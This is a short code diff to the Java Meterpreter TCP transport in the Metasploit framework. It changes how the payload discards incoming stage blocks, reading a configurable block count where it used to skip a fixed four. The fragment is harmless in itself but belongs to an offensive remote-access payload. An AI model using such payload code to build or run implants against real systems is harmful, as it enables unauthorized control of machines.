@@ -3,6 +3,7 @@ package com.metasploit.meterpreter;
 import java.io.DataInputStream;
 import java.io.DataOutputStream;
 import java.io.OutputStream;
+import java.io.EOFException;
 import java.io.IOException;
 
 import java.net.ServerSocket;
@@ -133,7 +134,7 @@ public class TcpTransport extends Transport {
             this.outputStream = new DataOutputStream(this.sock.getOutputStream());
 
             // this point we are effectively stageless, so flush the socket
-            this.flushInputStream();
+            this.flushInputStream(met.getIgnoreBlocks());
 
             return true;
         }
@@ -211,17 +212,18 @@ public class TcpTransport extends Transport {
         return false;
     }
 
-    private void flushInputStream() throws IOException {
+    private void flushInputStream(int blocks) throws IOException {
         // we can assume that the server is trying to send the second
         // stage at this point, so let's just read that in for now.
-        System.out.println("msf : Flushing the input stream");
-        // this includes 4 blobs of stuff we don't want
-        for (int i = 0; i < 4; i++) {
+        System.out.println("msf : Flushing the input stream, blocks is " + blocks);
+        for (int i = 0; i < blocks; i++) {
             System.out.println("msf : Flushing the input stream: " + i);
             int blobLen = this.inputStream.readInt();
             System.out.println("msf : Discarding bytes: " + blobLen);
             byte[] throwAway = new byte[blobLen];
             this.inputStream.readFully(throwAway);
         }
+        // and finally discard the block count
+        this.inputStream.readInt();
     }
 }
